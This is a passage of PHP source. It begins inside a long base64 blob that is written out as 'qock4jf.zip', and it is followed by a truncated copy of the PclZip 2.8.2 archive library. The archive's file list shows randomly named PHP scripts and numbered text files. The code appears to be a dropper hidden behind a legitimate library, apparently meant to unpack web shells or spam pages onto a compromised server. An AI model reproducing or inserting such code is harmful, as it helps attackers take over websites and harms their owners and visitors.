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"); 
file_put_contents("qock4jf.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
